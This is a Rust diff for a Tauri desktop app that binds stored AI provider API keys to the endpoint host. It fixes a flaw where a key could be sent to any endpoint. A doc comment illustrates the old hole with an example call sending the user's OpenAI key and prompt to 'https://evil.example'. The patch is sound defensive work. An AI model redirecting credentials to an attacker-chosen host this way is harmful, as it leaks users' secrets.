@@ -682,21 +682,51 @@ fn http() -> &'static reqwest::Client {
 const GEN_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(120);
 const TAGS_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(5);
 
-/// 線上 provider 的 API key（存 OS 金鑰庫，account `ai:<provider>`；ADR-0062）。
-fn api_key(provider: &str) -> Option<String> {
-    cinder_desktop::keyvault::get_key(&format!("ai:{provider}")).ok().flatten()
+use cinder_desktop::aikey::{endpoint_host, key_account, legacy_key_allowed};
+
+/// 線上 provider 的 API key——**綁定端點主機**（ADR-0235 H3）。
+///
+/// ## 修正前的缺口
+///
+/// 舊版是 `api_key(provider)`：只要 `provider == "openai"`，就對**呼叫端指定的任何 endpoint**
+/// 無條件 `.bearer_auth(key)`。`check_endpoint` 只驗 scheme 是 http/https，不驗主機。於是
+///
+/// ```ignore
+/// ai_generate("openai", "https://evil.example", model, prompt)
+/// ```
+///
+/// 會把使用者的 API key 當 Bearer token、連同訊息明文一起送給攻擊者指定的主機。前端雖有
+/// `ensureAllowed` 的 localhost 硬守則，但那是 **JS 層**——webview 一旦被 XSS 就完全繞過。
+///
+/// ## 現在的行為
+///
+/// key 以 `ai:<provider>:<host>` 存放，查詢時用**當次 endpoint 的主機**組 account。端點被換掉
+/// ＝查不到 key ＝ 回 `Err`，金鑰**根本不會被讀出來**。使用者換 provider 主機（OpenAI →
+/// OpenRouter）時需重新輸入 key——那本來就是不同的 key，是正確的 UX 而非退化。
+fn api_key(provider: &str, endpoint: &str) -> Option<String> {
+    let host = endpoint_host(endpoint)?;
+    if let Some(k) = cinder_desktop::keyvault::get_key(&key_account(provider, &host)).ok().flatten() {
+        return Some(k);
+    }
+    // 一次性沿用：舊版存在無主機的 `ai:<provider>`。只有當端點正是該 provider 的**官方主機**
+    // 時才沿用——否則舊 key 又會被送到任意主機，等於沒修。
+    if legacy_key_allowed(provider, &host) {
+        return cinder_desktop::keyvault::get_key(&format!("ai:{provider}")).ok().flatten();
+    }
+    None
 }
 
-/// 存某 provider 的 API key 到金鑰庫（不落 JS/localStorage）。
+/// 存某 provider 在**某端點**的 API key（不落 JS/localStorage）。
 #[tauri::command]
-fn ai_set_key(provider: String, key: String) -> Result<(), String> {
-    cinder_desktop::keyvault::set_key(&format!("ai:{provider}"), &key).map_err(|e| e.to_string())
+fn ai_set_key(provider: String, endpoint: String, key: String) -> Result<(), String> {
+    let host = endpoint_host(&endpoint).ok_or("無效的端點 URL")?;
+    cinder_desktop::keyvault::set_key(&key_account(&provider, &host), &key).map_err(|e| e.to_string())
 }
 
-/// 某 provider 是否已設 API key。
+/// 某 provider 在某端點是否已設 API key。
 #[tauri::command]
-fn ai_has_key(provider: String) -> bool {
-    api_key(&provider).is_some()
+fn ai_has_key(provider: String, endpoint: String) -> bool {
+    api_key(&provider, &endpoint).is_some()
 }
 
 /// 生成（改寫/摘要）。ollama → /api/generate；openai → /v1/chat/completions（Bearer key）。
@@ -704,7 +734,8 @@ fn ai_has_key(provider: String) -> bool {
 async fn ai_generate(provider: String, endpoint: String, model: String, prompt: String) -> Result<String, String> {
     check_endpoint(&endpoint)?;
     if provider == "openai" {
-        let key = api_key("openai").ok_or("未設定 OpenAI API key")?;
+        // ADR-0235 H3：key 綁主機——端點換掉就查不到，金鑰不會被讀出。
+        let key = api_key("openai", &endpoint).ok_or("此端點未設定 API key（請於設定中為該端點輸入）")?;
         let body = serde_json::json!({
             "model": model,
             "messages": [{ "role": "user", "content": prompt }],
@@ -746,7 +777,7 @@ async fn ai_available(provider: String, endpoint: String) -> bool {
         return false;
     }
     if provider == "openai" {
-        return api_key("openai").is_some();
+        return api_key("openai", &endpoint).is_some();
     }
     matches!(
         http().get(ai_url(&endpoint, "/api/tags")).timeout(TAGS_TIMEOUT).send().await,
@@ -759,7 +790,7 @@ async fn ai_available(provider: String, endpoint: String) -> bool {
 async fn ai_models(provider: String, endpoint: String) -> Result<Vec<String>, String> {
     check_endpoint(&endpoint)?;
     let (path, list_key, id_key, auth) = if provider == "openai" {
-        ("/v1/models", "data", "id", api_key("openai"))
+        ("/v1/models", "data", "id", api_key("openai", &endpoint))
     } else {
         ("/api/tags", "models", "name", None)
     };
@@ -1107,4 +1138,3 @@ fn main() {
         .run(tauri::generate_context!())
         .expect("執行 Tauri 應用程式時發生錯誤");
 }
-
